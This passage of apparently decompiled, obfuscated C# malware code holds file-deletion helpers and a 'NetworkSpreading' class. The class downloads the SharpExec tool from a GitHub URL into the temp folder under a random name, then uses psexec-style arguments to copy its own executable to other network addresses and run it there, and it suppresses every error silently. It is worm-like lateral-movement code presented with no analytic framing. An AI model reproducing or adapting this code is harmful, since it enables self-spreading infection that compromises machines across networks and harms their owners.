            System.IO.File.Delete(this.f000044);
            break;
          }
          catch
          {
            Thread.Sleep(1500);
          }
        }
      }

      public void m00001e()
      {
        while (true)
        {
          try
          {
            if (!System.IO.File.Exists(this.eedfnXcwSQkQNFbIx))
              break;
            System.IO.File.Delete(this.eedfnXcwSQkQNFbIx);
            break;
          }
          catch
          {
            Thread.Sleep(1500);
          }
        }
      }
    }

    public class NetworkSpreading
    {
      public static List<string> lanList = new List<string>();
      public static string MyIP = "";

      public static void Run()
      {
        try
        {
          GhAMvbuoccW.NetworkSpreading.lanList = GhAMvbuoccW.NetworkSpreading.GetLocalNetwork();
          string str = "";
          if (GhAMvbuoccW.NetworkSpreading.lanList.Count > 0)
            str = GhAMvbuoccW.NetworkSpreading.DownloadTool();
          if (System.IO.File.Exists(str))
          {
            foreach (string lan1 in GhAMvbuoccW.NetworkSpreading.lanList)
            {
              GhAMvbuoccW.NetworkSpreading.MyIP = lan1;
              foreach (string lan2 in GhAMvbuoccW.NetworkSpreading.lanList)
              {
                if (!(lan2 == GhAMvbuoccW.NetworkSpreading.MyIP))
                  GhAMvbuoccW.m000002(str, "-m=psexec -i=" + GhAMvbuoccW.NetworkSpreading.MyIP + " -d=" + lan2 + " -f=" + Assembly.GetEntryAssembly().Location + " -e=" + Path.Combine(Path.GetTempPath(), Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe"));
              }
            }
          }
          System.IO.File.Delete(str);
        }
        catch
        {
        }
      }

      public static List<string> GetLocalNetwork()
      {
        List<string> localNetwork = new List<string>();
        foreach (IPAddress address in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
        {
          if (address.AddressFamily.ToString() == "InterNetwork")
            localNetwork.Add(address.ToString());
        }
        return localNetwork;
      }

      public static string DownloadTool() => IntPtr.Size != 8 ? GhAMvbuoccW.NetworkSpreading.DownloadFile(new Uri("https://github.com/m1ddl3w4r3/SharpCollection/blob/master/NetFramework_4.7_x86/SharpExec.exe?raw=true")) : GhAMvbuoccW.NetworkSpreading.DownloadFile(new Uri("https://github.com/m1ddl3w4r3/SharpCollection/blob/master/NetFramework_4.7_x64/SharpExec.exe?raw=true"));

      public static string DownloadFile(Uri Url)
      {
        string path2 = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
        new WebClient().DownloadFile(Url, Path.Combine(Path.GetTempPath(), path2));
        return Path.Combine(Path.GetTempPath(), path2);
      }
    }
  }
}
